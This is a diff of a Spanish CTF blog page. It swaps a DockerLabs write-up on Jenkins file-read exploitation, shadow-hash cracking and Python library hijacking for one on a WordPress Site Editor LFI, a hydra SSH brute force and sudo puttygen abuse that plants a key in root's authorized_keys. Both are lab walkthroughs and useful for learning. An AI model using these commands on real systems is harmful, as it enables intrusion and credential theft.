@@ -44,25 +44,25 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="HiddenCat , DockerLabs" />
+<meta property="og:title" content="Asucar , DockerLabs" />
 <meta property="og:locale" content="es" />
 <meta name="description" content="Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell" />
 <meta property="og:description" content="Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell" />
-<link rel="canonical" href="http://localhost:4000/posts/hiddencat/" />
-<meta property="og:url" content="http://localhost:4000/posts/hiddencat/" />
+<link rel="canonical" href="http://localhost:4000/posts/asucar/" />
+<meta property="og:url" content="http://localhost:4000/posts/asucar/" />
 <meta property="og:site_name" content="CTF’s Linux Apuntes" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2024-05-10T00:00:00-03:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HiddenCat , DockerLabs" />
+<meta property="twitter:title" content="Asucar , DockerLabs" />
 <meta name="twitter:site" content="@firstatack" />
 <meta name="google-site-verification" content="W-9NcBppWJit0_JSlb-tSEccz0fimupFf4latnvZtZQ" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-10T00:00:00-03:00","datePublished":"2024-05-10T00:00:00-03:00","description":"Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell","headline":"HiddenCat , DockerLabs","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/hiddencat/"},"url":"http://localhost:4000/posts/hiddencat/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-10T00:00:00-03:00","datePublished":"2024-05-10T00:00:00-03:00","description":"Blog dedicado a la resolucion de maquinas CTF, la ciberseguridad, temas de linux. hydra feroxbuster nmap chisel nc y algun oftopic. hacking pentesting manuales writeups tutorial python bash reverse shell","headline":"Asucar , DockerLabs","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/asucar/"},"url":"http://localhost:4000/posts/asucar/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>HiddenCat , DockerLabs | CTF's Linux Apuntes
+  <title>Asucar , DockerLabs | CTF's Linux Apuntes
   </title>
 
   <!--
@@ -478,7 +478,7 @@
         
           
             
-              <span>HiddenCat , DockerLabs</span>
+              <span>Asucar , DockerLabs</span>
             
 
           
@@ -1136,69 +1136,6 @@
     <!-- combine -->
     
   
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
 
   
 
@@ -1224,39 +1161,6 @@
       
         
         
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
       
 
       
@@ -1319,7 +1223,7 @@
 
 <article class="px-1">
   <header>
-    <h1 data-toc-skip>HiddenCat , DockerLabs</h1>
+    <h1 data-toc-skip>Asucar , DockerLabs</h1>
 
     <div class="post-meta text-muted">
       <!-- published date -->
@@ -1386,9 +1290,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="277 words"
+  title="396 words"
 >
-  <em>1 min</em> read</span>
+  <em>2 min</em> read</span>
 
       </div>
       <!-- .d-flex -->
@@ -1399,16 +1303,15 @@
   <div class="content">
     <p><a href="/assets/logo-dockerlabs.png" class="popup img-link  shimmer"><img src="/assets/logo-dockerlabs.png" alt="logodocker" width="200" height="200" loading="lazy"></a></p>
 
-<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada con python.</p>
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema , explotacion LFI wordpres ,fuerza bruta ssh y escalada final muy curiosa .</p>
 
 <h2 id="herramientas-y-recursos-usados"><span class="me-2">Herramientas y recursos usados</span><a href="#herramientas-y-recursos-usados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
 <ul>
   <li>nmap</li>
-  <li>Feroxbuster</li>
-  <li>John the riper</li>
-  <li>scp</li>
-  <li>Python Library hijacking</li>
+  <li>nslookup</li>
+  <li>wpscan</li>
+  <li>puttygen</li>
 </ul>
 
 <h2 id="enumeracion"><span class="me-2">Enumeracion</span><a href="#enumeracion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
@@ -1418,106 +1321,119 @@
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> SecretJenkins
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-oX</span> asucar 172.17.0.2
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/reporte/SecretJenkins.html" title="reportesnmap">Reporte nmap</a></p>
+<p><a href="/reporte/asucar.html" title="reportesnmap">Reporte nmap</a></p>
 
-<p>Nmap nos informa que tenemos el 22 abierto y el 8080 corriendo un servidor web con jenkins.
-Empezmos con jenkins intentando averiguar la version para ver si se puede explotar de algun modo.</p>
+<p>Nmap nos informa que tenemos el 22 abierto y el 80 corriendo un wordpress en su version 6.5.3.</p>
 
-<p>Lanzo whatweb</p>
-
-<p><a href="/assets/SecretJenkins/whatweb.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/whatweb.png" alt="whatweb" loading="lazy"></a></p>
-
-<p>Ya sabemos la version ahora busquemos como explotarla.</p>
-
-<h2 id="explotacion-jenkins"><span class="me-2">Explotacion jenkins</span><a href="#explotacion-jenkins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-<p><a href="https://github.com/godylockz/CVE-2024-23897">exploit CVE-2024-23897</a></p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre><span class="nb">chmod</span> +x jenkins_fileread.py
-./jenkins_fileread.py <span class="nt">-u</span> http://<span class="nv">$ipvictima</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>Leemos y nos copiamos a nuestra maquina el contenido de /etc/passw y /etc/shadow.</p>
-
-<p><a href="/assets/SecretJenkins/passwd.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/passwd.png" alt="passwd" loading="lazy"></a></p>
-
-<p><a href="/assets/SecretJenkins/shadow.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/shadow.png" alt="shadow" loading="lazy"></a></p>
-
-<h2 id="craking-con-john"><span class="me-2">Craking con john</span><a href="#craking-con-john" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-<p>Los unimos haciendo uso de unshadow</p>
+<p>Cuando entro a la web la veo que no carga bien los estilos .</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>unshadow passwd shadow <span class="o">&gt;</span> unshadow
-
-john unshadow
+</pre></td><td class="rouge-code"><pre>nslookup 172.17.0.2
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/SecretJenkins/cracked.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/cracked.png" alt="cracked" loading="lazy"></a></p>
+<p><a href="/assets/asucar/domain.png" class="popup img-link  shimmer"><img src="/assets/asucar/domain.png" alt="domain" loading="lazy"></a></p>
+
+<p>Añadimos a /etc/hosts recargamos la web y la revisamos.
+No soy capaz de encontrar nada util ,en google encuentro esto.</p>
+
+<p><a href="/assets/asucar/vulnerable.png" class="popup img-link  shimmer"><img src="/assets/asucar/vulnerable.png" alt="vulnerable" loading="lazy"></a></p>
+
+<p>Lo cual tampoco sirve pues no esta instalado dicho plugin.</p>
+
+<p>Ejecuto wpscan</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>wpscan <span class="nt">--api-token</span> xxxxxxxxxxxxxxxxxx <span class="nt">--url</span> http://asucar.dl <span class="nt">--enumerate</span> u,vp
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Tengo suerte y me halla un local file inclusion.</p>
+
+<p><a href="/assets/asucar/wpscan.png" class="popup img-link  shimmer"><img src="/assets/asucar/wpscan.png" alt="wpscan" loading="lazy"></a></p>
+
+<p>Buscamosen google exploit wordpress site editor lfi y el primer resultado.</p>
+
+<p><a href="/assets/asucar/exploit.png" class="popup img-link  shimmer"><img src="/assets/asucar/exploit.png" alt="exploit" loading="lazy"></a></p>
 
 <h2 id="infiltracion"><span class="me-2">Infiltracion</span><a href="#infiltracion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>Tenemos suerte y cuando encuetra la pass de bobby corto el craking y entro con bobby.</p>
+<p>Ajustamos la ruta y probamos.</p>
 
-<p><a href="/assets/SecretJenkins/sudobobby.png.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/sudobobby.png.png" alt="sudobobby" loading="lazy"></a></p>
+<div class="language-text highlighter-rouge"><div class="code-header">
+        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+</pre></td></tr></tbody></table></code></div></div>
 
-<p>Nos aprovechamos de python para convertirnos en pinguino.</p>
+<p><a href="/assets/asucar/lfi.png" class="popup img-link  shimmer"><img src="/assets/asucar/lfi.png" alt="lfi" loading="lazy"></a></p>
+
+<p>Tenemos exito y ya tenemos usuario es hora de hydra.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-u</span> pinguinito python <span class="nt">-c</span> <span class="s1">'import os; os.system("/bin/sh")'</span>
+</pre></td><td class="rouge-code"><pre> hydra <span class="nt">-l</span> curiosito <span class="nt">-P</span> rockyou.txt ssh://172.17.0.2 <span class="nt">-t</span> 4
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/SecretJenkins/movimientolat.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/movimientolat.png" alt="movilat" loading="lazy"></a></p>
+<p><a href="/assets/asucar/hydra.png" class="popup img-link  shimmer"><img src="/assets/asucar/hydra.png" alt="hydra" loading="lazy"></a></p>
 
-<p>Ya somo el usuario pinguinito ahora toca ser root haber que encontramos.</p>
+<p>Hacemos login y ejecutamos lo de siempre.</p>
 
-<p><a href="/assets/SecretJenkins/sudopin.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/sudopin.png" alt="sudopin" loading="lazy"></a></p>
+<p><a href="/assets/asucar/sudo.png" class="popup img-link  shimmer"><img src="/assets/asucar/sudo.png" alt="sudo" loading="lazy"></a></p>
 
-<h2 id="escalada-final"><span class="me-2">Escalada Final</span><a href="#escalada-final" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Me encuentro con un binario con el que nunca he hecho la escalada <strong>puttygen</strong> a tirar de google para ver como funciona el puttygen.</p>
 
-<p>Como vemos tenemos la misma escalada que en la maquina library.</p>
+<p>Nos sirve para crear claves ssh , he proabado de distintas formas pero por temas de permisos de escritura no consegui hacerlo como queria , asi que hay que hacerlo primero en el home del usario con el que estamos conectados y luego copiar lo creado con <strong>sudo puttygen</strong> para poder escribir en el directorio de root.</p>
 
-<p>Asi que hacemos lo mismo heber si funciona tambien en esta.</p>
-
-<p>Nos creamos un script en python llamado shutil.py y lo añadimos al PATH , despues ejecutamos con sudo.</p>
-
-<p>Contenido del script</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>import os 
-
-os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>Directorio de trabajo</p>
-
-<p><a href="/assets/SecretJenkins/ls.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/ls.png" alt="opt" loading="lazy"></a></p>
-
-<p>Ejecutamos</p>
+<p>Primero creamos las claves:</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo</span> /usr/bin/python3 /opt/script.sh
+</pre></td><td class="rouge-code"><pre>puttygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048 <span class="nt">-O</span> private-openssh <span class="nt">-o</span> ~/.ssh/hacked
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/SecretJenkins/root.png" class="popup img-link  shimmer"><img src="/assets/SecretJenkins/root.png" alt="root" loading="lazy"></a></p>
+<p>El siguiente paso es añadir el contenido de la clave publica que extraemos de la privada añadiendolo a authorized_keys</p>
 
-<p>Hasta aqui la maquinta , pls insert more coins</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>puttygen <span class="nt">-L</span> ~/.ssh/hacked <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
+</pre></td></tr></tbody></table></code></div></div>
 
-<p>Gracias por leer compartamos conocimiento.</p>
+<p>Ya tenemos todo listo en el directorio del usario pero lo queremos en root , en este momento es cuando realmente abusamos de puttygen usandolo con sudo para copiar a su directorio.</p>
 
+<p>Copiamos la clave.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>puttygen /home/curiosito/.ssh/hacked <span class="nt">-o</span> /root/.ssh/hacked
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Añadimos la clave al authorized_keys</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>puttygen /home/curiosito/.ssh/hacked <span class="nt">-o</span> /root/.ssh/authorized_keys <span class="nt">-O</span> public-openssh
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Por ultimos podemos descargar la clave o conectarnos desde el mismo terminal.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ssh <span class="nt">-i</span> /home/curiosito/.ssh/hacked root@localhost
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/asucar/root.png" class="popup img-link  shimmer"><img src="/assets/asucar/root.png" alt="root" loading="lazy"></a></p>
+
+<p>Esta se me complico buscando info de puttygen mucha mierda de windows me salia.</p>
+
+<p>Gracias por leer.</p>
 
   </div>
 
@@ -1585,21 +1501,21 @@ os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=HiddenCat%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhiddencat%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=Asucar%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fasucar%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=HiddenCat%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhiddencat%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Asucar%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fasucar%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhiddencat%2F&text=HiddenCat%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fasucar%2F&text=Asucar%20,%20DockerLabs%20-%20CTF's%20Linux%20Apuntes" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -1661,7 +1577,7 @@ os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/hiddencat/">HiddenCat , DockerLabs</a>
+          <a href="/posts/asucar/">Asucar , DockerLabs</a>
         </li>
       
         
@@ -2349,8 +2265,8 @@ Herramientas y recursos usados
 
 <script type="text/javascript">
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/posts/hiddencat/';
-    this.page.identifier = '/posts/hiddencat/';
+    this.page.url = 'http://localhost:4000/posts/asucar/';
+    this.page.identifier = '/posts/asucar/';
   };
 
   /* Lazy loading */
